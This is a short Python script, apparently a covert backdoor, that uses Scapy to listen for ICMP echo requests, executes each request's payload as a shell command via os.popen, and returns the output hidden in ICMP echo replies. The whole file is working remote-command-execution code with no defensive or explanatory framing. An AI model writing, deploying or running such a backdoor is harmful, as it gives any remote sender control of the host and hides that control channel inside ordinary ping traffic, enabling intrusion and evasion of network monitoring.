from scapy.all import *
import os

# Define a callback function to handle sniffed packets
def icmp_packet_handler(packet):
    if packet.haslayer(ICMP):
        if ICMP in packet and packet[ICMP].type == 8:
            command = packet[Raw].load
            output = os.popen(command.decode("utf-8")).read()
            print(output)
            echo_reply = IP(dst=packet[IP].src)/ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)/output
            # Envia o pacote Echo Reply
            send(echo_reply)


sniff(filter="icmp", prn=icmp_packet_handler, iface="eth0")
                                                            
